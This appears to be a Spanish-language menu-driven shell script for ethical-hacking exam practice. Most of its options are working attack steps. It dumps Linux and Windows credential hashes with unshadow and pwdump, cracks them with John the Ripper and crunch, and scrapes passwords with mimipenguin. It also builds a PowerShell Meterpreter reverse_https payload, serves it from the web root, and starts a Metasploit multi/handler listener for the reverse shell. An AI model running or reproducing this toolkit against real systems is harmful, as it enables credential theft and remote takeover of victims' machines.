#!/bin/sh
black=$(tput setaf 0)
red=$(tput setaf 1)
green=$(tput setaf 2)
yellow=$(tput setaf 3)
blue=$(tput setaf 4)
magenta=$(tput setaf 5)
cyan=$(tput setaf 6)
white=$(tput setaf 7)

normal=$(tput sgr0)

pause(){
  read -p "[Enter] para continuar..." Key
}

#whois -h whois.nic.ar tgn.com.ar >> 00.txt
# enscript -p- 00.txt | ps2pdf - hola.pdf 


val='0'
chek(){
	if [ -x /usr/bin/$1 ] || [ -x /usr/sbin/$1 ] || [ -x /usr/local/bin/$1 ] || [ -x /bin/$1 ]; then
          echo "El programa \"$1\" está instalado."
          val='1'
           else
          echo "No está instalado \"$1\"."
          val='0'
          
          fi
          
     
}

say(){

if [ $val == '0' ]
             then
               echo -n $caption
               echo -n $simbol
             else
               echo -n $caption | iconv -f utf-8 -t iso-8859-1|festival --tts
               echo -n $simbol
             fi     
}   


#soporte para voz comentar si no se desea esta capacidad
#chek festival

#reconocimiento  -->recoelccion de informacion - enumeracion - investigacion
#escaneo  --> identificacion de vulnerabilidades - definicion de vectores de ataque - validacion de la vulnerabilidad
#evaluacion --> pruebas con exploits - pruebas con credenciales - penetracion - escalamiento dprivilegios - post explotacion 
#analisis --> evaluacion de riesgo - reporte.
  



while true

do
clear
          printf "\t$green==========================================\n"
          printf "\t$red                CE-COUNCIL test\n"
          printf "\t$green==========================================\n"
          printf "\t$red[whois_ar]$green whois AR\n"
          printf "\t$red[whois]$green whois resto del pais\n"
          printf "\t$red[dig]$green DIG \n"
          printf "\t$red[pwd_lin]$green unshadows linux credentials \n"
          printf "\t$red[pwd_win]$green creddump pwdump win credentials \n"
          printf "\t$red[jtr_lin]$green format=sha256 \n"
          printf "\t$red[jtr_win]$green format=nt \n"
          printf "\t$red[jtr_win_cr]$green format=nt | crunch attack \n"
          printf "\t$red[jtr_pass]$green Lista de pass jtr bug ? \n"
          printf "\t$red[md4_win7]$green Generador simple de HASH MD4 \n"
          printf "\t$red[mimipenguin]$green mimipenguin \n"
          printf "\t$red[ps_x64]$green ps1encode \n"
         printf "\t$red[msf_server]$green msfconsole multi \n"
           
          printf "\t$red[v]$greenVolver \n"
          printf "\t$green==========================================\n"
          printf "\t$red [*]-:"
          printf $normal
          
          read opc2
          case $opc2 in
          
          1)
              
              
          
          pause;;
          
          whois_ar)
             #****************************************************************************************
             caption='Ingrese el dominio:'
             simbol='[*]-:'
             say $caption $simbol
             #****************************************************************************************
            read host
            whois -h whois.nic.ar $host | grep ':'>>$host.txt
            enscript -p- $host.txt| ps2pdf - $host.pdf

            #enscript -p- - | ls | ps2pdf - hola.pdf 
            
            pause;;
          whois)
             #****************************************************************************************
             caption='Ingrese el dominio:'
             simbol='[*]-:'
             say $caption $simbol
             #****************************************************************************************
            read host
            whois $host | grep ':' | sed '>>>'>>$host.txt
            enscript -p- $host.txt| ps2pdf - $host.pdf

            #enscript -p- - | ls | ps2pdf - hola.pdf 
            
            pause;;
          dig)
             #****************************************************************************************
             caption='Ingrese el dominio:'
             simbol='[*]-:'
             say $caption $simbol
             #****************************************************************************************
            read host
            dig $host | grep ':'>>$host.txt
            enscript -p- $host.txt| ps2pdf - $host.pdf

            #enscript -p- - | ls | ps2pdf - hola.pdf 
            
            pause;;
          
          pwd_win)
                  pwdump CE/SYSTEM CE/SAM
                  pwdump CE/SYSTEM CE/SAM > CE/hash-win.enc
                  pause;;
          pwd_lin)
                  #grep -A 18 ENCRYPT_METHOD /etc/login.defs
                  sudo unshadow /etc/passwd /etc/shadow
                  sudo unshadow /etc/passwd /etc/shadow > CE/hash-lin.enc
                  pause;;        
            
          jtr_lin)             
                 /opt/john/run/john --pot=/opt/john/run/john.pot -w=CE/pass.lst CE/hash-lin.enc
                 /opt/john/run/john --show hash-lin.enc
                 pause;;
            
          jtr_win)
                 /opt/john/run/john --pot=/opt/john/run/john.pot -format=nt -w=CE/pass2.lst CE/hash-win.enc
                 /opt/john/run/john --show CE/hash-win.enc
                 pause;;
            
     jtr_win_cr)    
                pwdump CE/SYSTEM CE/SAM > CE/hash-win.enc
                crunch 10 10 -t inicio%%%% |/opt/john/run/john --pot=/opt/john/run/john.pot -format=nt --stdin CE/hash-win.enc
                /opt/john/run/john --show CE/hash-win.enc
           pause;;
            
       jtr_pass) 
               cat /opt/john/run/john.pot    
          pause;;
         
       mimipenguin)
                   sudo mimipenguin
            pause;; 
            
       md4_win7)
               #****************************************************************************************
               caption='Ingrese el dominio:'
               simbol='[*]-:'
               say $caption $simbol
               #****************************************************************************************
               read pass
               printf '%s' $pass | iconv -t utf16le | openssl md4   
         pause;;         
         
        ps_x64)
        #msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.1.101 -b "\x00" -f exe -o Meterpreter.exe
        
               #generar el malware en formato *.ps1 windows/mwterpreter/reverse_https 
               #Get-Content time.ps1 | powershell -noprofile -

               ps1encode --LPORT=4444 --LHOST=192.168.8.101 --PAYLOAD=windows/meterpreter/reverse_https > back2.ps1
               sudo cp back2.ps1 /var/www/html
               ls /var/www/html
               #arrancar aache2
               sudo systemctl start apache2
               #ver servicios y puertos corriendo de modo local
               sudo ufw status
               
              
        pause;; 
        
        msf_server)#windows/meterpreter/reverse_https
        
 #Platform: Android, Apple_iOS, BSD, Java, JavaScript, Linux, OSX, NodeJS, PHP, Python, Ruby, Solaris, Unix, Windows, Mainframe, Multi
 #Arch: x86, x86_64, x64, mips, mipsle, mipsbe, mips64, mips64le, ppc, ppce500v2, ppc64, ppc64le, cbea, cbea64, sparc, sparc64, armle, armbe, aarch64, cmd, php, tty, java, ruby, dalvik, python, nodejs, firefox, zarch, r

               echo use exploit/multi/handler > meterpreter.rc
               echo set PAYLOAD windows/meterpreter/reverse_https >> meterpreter.rc
               echo set LHOST 192.168.8.101   >> meterpreter.rc
               echo set LPORT 4444 >> meterpreter.rc
               echo set ExitOnSession false >> meterpreter.rc
               echo exploit -j -z >> meterpreter.rc
               msfconsole -r meterpreter.rc
        
        #sudo netstat -ap | grep :4444
        #sudo apt install dsniff
        #tcpkill -i eth0 host xxx.xxx.xxx.xxx and port yyyy
        #wlxf8d111144e71
        #tcpkill -i wlxf8d111144e71 host 0.0.0.0 and port 4444

        #IP=`ifconfig wifi0 | grep "inet addr" |awk -F: '{print $2}'| awk '{print $1}'`
        #msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST '$IP';set ExitOnSession false;exploit -j -z"
        pause;;
        
        
        
        v)
          return 0;;
     *)
          printf "Seleciona una opcion valida :)";
          pause;;          
  esac
        
done
